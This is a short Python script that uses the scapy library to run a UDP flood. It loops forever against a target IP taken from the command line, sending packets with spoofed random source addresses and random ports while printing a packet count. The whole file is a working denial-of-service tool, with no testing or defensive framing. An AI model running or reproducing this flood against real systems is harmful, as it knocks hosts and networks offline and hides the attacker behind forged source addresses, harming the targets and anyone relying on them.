from scapy.all import *
import sys

def udp_flood(target_ip):
    packet_count = 0
    while True:
        # Send a UDP packet with a random source IP, source port, and destination port
        send(IP(src=RandIP(),dst=target_ip) / UDP(sport=RandShort(),dport=RandShort()), verbose=False)
        packet_count += 1
        print(f"Sent {packet_count} packets to {target_ip}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 udp_flood.py <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    udp_flood(target_ip)
